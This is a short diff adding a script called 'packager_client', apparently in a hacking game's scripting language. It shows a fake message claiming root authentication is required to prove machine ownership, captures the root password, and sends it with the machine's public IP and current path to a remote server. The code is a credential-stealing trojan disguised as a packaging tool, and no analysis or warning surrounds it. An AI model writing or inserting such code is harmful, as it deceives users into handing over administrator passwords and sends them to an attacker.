@@ -1,0 +1,6 @@
+//packager_client
+print("warning: to proceed , you need to authenficate root.This is to prove that you are the owner of the current machine.")
+root_cred = user_input("password: ",true)
+server = get_shell.connect_service(//server_ip,//server_port,//server_user,//server_pass,//server_service)
+package_args = get_router.public_ip + " " + root_cred + " " + get_shell.host_computer.current_path
+exit(server.launch("/server/packager",package_args))
